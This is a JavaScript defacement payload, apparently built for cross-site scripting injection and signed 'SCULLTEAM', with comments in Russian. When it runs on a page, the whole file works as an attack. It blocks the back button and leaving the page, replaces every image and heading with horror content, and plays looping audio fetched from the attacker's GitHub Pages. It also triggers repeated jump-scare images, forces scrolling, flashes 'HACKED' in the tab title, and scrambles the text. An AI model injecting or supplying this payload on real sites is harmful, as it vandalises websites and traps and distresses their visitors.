alert('H4CK3D BY SCULLTEAM');

// Блокировка возврата назад
window.history.pushState(null, null, window.location.href);
window.onpopstate = () => window.history.pushState(null, null, window.location.href);
window.addEventListener('beforeunload', e => {
    e.preventDefault();
    e.returnValue = '';
});

// Музыка
setTimeout(() => {
    const scaryMusic = document.createElement("audio");
    scaryMusic.src = "https://scullteam.github.io/XSS/scary.mp3";
    scaryMusic.loop = true;
    scaryMusic.play();
}, 1000);

// Список изображений
const imageList = [
    "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg",
    "https://i.ibb.co/3mW0gHbN/SCULLTEAM.png"
];

// Замена всех изображений на случайное из списка
document.querySelectorAll("img").forEach(img => {
    const randomImg = imageList[Math.floor(Math.random() * imageList.length)];
    img.src = randomImg;
});

// Замена текста
const replacementText = "HEY, TURN AROUND, TURN AROUND";
const replacementLinkText = "THERE IS NO ESCAPE";
document.querySelectorAll("p, h1, h2, h3, h4, h5, h6").forEach(e => e.textContent = replacementText);
document.querySelectorAll("a").forEach(e => e.textContent = replacementLinkText);

// <a> → <p>
document.querySelectorAll("a").forEach(link => {
    const p = document.createElement("p");
    p.textContent = link.textContent;
    [...link.attributes].forEach(attr => p.setAttribute(attr.name, attr.value));
    link.replaceWith(p);
});

// Скример
function showScreamer() {
    const img = document.createElement("img");
    img.id = "fullScreenImg";
    img.src = "https://wallpapers.com/images/high/scary-face-pictures-fvx05bim45ctjiwh.webp";
    document.body.appendChild(img);

    const scream = document.createElement("audio");
    scream.src = "https://scullteam.github.io/XSS/krik.mp3";
    document.body.appendChild(scream);
    scream.play();

    setTimeout(() => img.remove(), 800);
}

[6000,13000,25000,45000,75000,90000,105000,120000,135000].forEach(t => setTimeout(showScreamer, t));

// Автопрокрутка
setInterval(() => {
    window.scrollBy(0, 100);
    setTimeout(() => window.scrollBy(0, -100), 200);
}, 500);

// Мигающий title
let originalTitle = document.title;
setInterval(() => {
    document.title = document.title === originalTitle ? "!!! HACKED !!!" : originalTitle;
}, 400);

// Glitch-эффект
document.querySelectorAll("h1, h2, h3, p, a, li").forEach(e => e.classList.add("glitch"));

// Случайный вирусный текст
setInterval(() => {
    const messages = ["YOU SHOULDN'T BE HERE", "ERROR 666", "I'M WATCHING YOU", "ACCESS GRANTED TO HELL"];
    const msg = document.createElement("h1");
    msg.textContent = messages[Math.floor(Math.random() * messages.length)];
    msg.style.position = "absolute";
    msg.style.top = Math.random() * window.innerHeight + "px";
    msg.style.left = Math.random() * window.innerWidth + "px";
    msg.style.color = "red";
    msg.style.fontSize = "30px";
    msg.style.zIndex = 9999;
    document.body.appendChild(msg);
    setTimeout(() => msg.remove(), 3000);
}, 2000);

// Разрушение текста
setInterval(() => {
    document.querySelectorAll("p, h1, h2, a, li").forEach(el => {
        el.textContent = el.textContent.split('').sort(() => 0.5 - Math.random()).join('');
    });
}, 5000);

// Звук на каждый клик
document.addEventListener("click", () => {
    const clickAudio = new Audio("https://scullteam.github.io/XSS/click.mp3");
    clickAudio.play();
});